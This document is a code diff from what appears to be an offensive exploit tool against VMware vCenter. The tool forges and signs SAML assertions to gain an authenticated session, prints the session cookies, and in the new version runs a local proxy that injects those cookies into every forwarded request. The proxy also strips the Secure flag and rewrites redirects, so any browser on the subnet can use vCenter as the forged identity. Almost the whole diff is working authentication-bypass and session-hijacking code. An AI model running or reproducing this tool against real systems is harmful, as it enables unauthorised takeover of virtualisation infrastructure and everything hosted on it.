@@ -2037,26 +2037,24 @@ def main():
                                                      key_pem, cert1_pem, cert2_pem, authn_id)
 
         if choice == '1':
-            import http.server, threading, socket as _socket
+            import http.server, threading, socket as _socket, re as _re
+            import requests as _req
+            _req.packages.urllib3.disable_warnings()
 
-            # Python-side login — proves the token works and shows the cookie values
+            # Authenticate via Python (confirmed working)
             cname, cval, ui_session = saml_login(target, signed, relay_state)
-            print(f'\n[+] https://{target}/ui/')
+            print(f'\n[+] Authenticated session cookies:')
             print(f'    {cname}={cval}')
             for extra in ('VSPHERE-CLIENT-SESSION-INDEX', 'VSPHERE-USERNAME'):
                 v = ui_session.cookies.get(extra)
                 if v:
                     print(f'    {extra}={v}')
 
-            # IdP-initiated SAML delivered via standard HTTP POST binding.
-            # Kali serves one HTML page; the page auto-submits a form directly
-            # to vCenter's ACS endpoint.  vCenter's 302 sets HttpOnly cookies
-            # in the browser's jar (same as any real IdP post-binding flow).
-            # No relay-state TTL to race; SAML is valid for 30 days.
-            signed2  = build_and_sign_saml(target, hostname, domain,
-                                           key_pem, cert1_pem, cert2_pem, authn_id='')
-            saml_b64 = base64.b64encode(signed2).decode()
-
+            # Build a proxy session pre-loaded with the vCenter cookies.
+            # The browser talks to this proxy; the proxy forwards every request
+            # to vCenter with the authenticated session injected.  No cookie
+            # injection into the browser is needed — the browser just sees
+            # the proxy serving vCenter content.
             try:
                 _sock = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
                 _sock.connect((target, 443))
@@ -2065,34 +2063,62 @@ def main():
             except Exception:
                 local_ip = '0.0.0.0'
 
-            html = (
-                '<!DOCTYPE html><html><body>'
-                '<p style="font-family:monospace">Authenticating to vCenter...</p>'
-                f'<form id="f" method="POST" action="https://{target}/ui/saml/websso/sso">'
-                f'<input type="hidden" name="SAMLResponse" value="{saml_b64}">'
-                '</form>'
-                '<script>document.getElementById("f").submit();</script>'
-                '</body></html>'
-            ).encode()
+            vc_base  = f'https://{target}'
+            _skip    = {'transfer-encoding', 'connection', 'keep-alive',
+                        'content-encoding', 'host', 'cookie'}
+            _pxsess  = _req.Session()
+            _pxsess.verify = False
+            for _n, _v in ui_session.cookies.items():
+                _pxsess.cookies.set(_n, _v, domain=target, path='/ui')
 
-            class _H(http.server.BaseHTTPRequestHandler):
-                def do_GET(self):
-                    self.send_response(200)
-                    self.send_header('Content-Type', 'text/html; charset=utf-8')
-                    self.send_header('Content-Length', str(len(html)))
-                    self.end_headers()
-                    self.wfile.write(html)
-                def log_message(self, *_):
+            def _strip_secure(val):
+                return _re.sub(r';\s*Secure', '', val, flags=_re.I)
+
+            class _Proxy(http.server.BaseHTTPRequestHandler):
+                def do_GET(self):  self._fwd('GET')
+                def do_POST(self): self._fwd('POST')
+                def do_PUT(self):  self._fwd('PUT')
+                def do_DELETE(self): self._fwd('DELETE')
+                def do_PATCH(self):  self._fwd('PATCH')
+
+                def _fwd(self, method):
+                    px_base = f'http://{local_ip}:{srv.server_address[1]}'
+                    url  = f'{vc_base}{self.path}'
+                    n    = int(self.headers.get('Content-Length', 0))
+                    body = self.rfile.read(n) if n else None
+                    hdrs = {k: v for k, v in self.headers.items()
+                            if k.lower() not in _skip}
+                    try:
+                        r = _pxsess.request(method, url, headers=hdrs,
+                                            data=body, allow_redirects=False,
+                                            verify=False, timeout=30)
+                        self.send_response(r.status_code)
+                        for k, v in r.headers.items():
+                            kl = k.lower()
+                            if kl in _skip: continue
+                            if kl == 'set-cookie':
+                                v = _strip_secure(v)
+                            elif kl == 'location' and v.startswith(vc_base):
+                                v = px_base + v[len(vc_base):]
+                            self.send_header(k, v)
+                        self.end_headers()
+                        self.wfile.write(r.content)
+                    except Exception as exc:
+                        self.send_response(502)
+                        self.end_headers()
+                        self.wfile.write(str(exc).encode())
+
+                def log_message(self, fmt, *args):
                     pass
 
-            srv = http.server.HTTPServer(('0.0.0.0', 0), _H)
+            srv = http.server.HTTPServer(('0.0.0.0', 0), _Proxy)
             port = srv.server_address[1]
             threading.Thread(target=srv.serve_forever, daemon=True).start()
 
-            print(f'\n[+] Open in your browser (any machine on this subnet):')
-            print(f'\n    http://{local_ip}:{port}/')
-            print(f'\n    The page auto-submits the SAML form → vCenter sets cookies → /ui/')
-            input('\n    Press Enter when done to stop the server...\n')
+            print(f'\n[+] Proxy ready — open this URL in any browser on the subnet:')
+            print(f'\n    http://{local_ip}:{port}/ui/')
+            print(f'\n    All traffic is forwarded to vCenter using the authenticated session above.')
+            input('\n    Press Enter when done to stop the proxy...\n')
             srv.shutdown()
             return
 
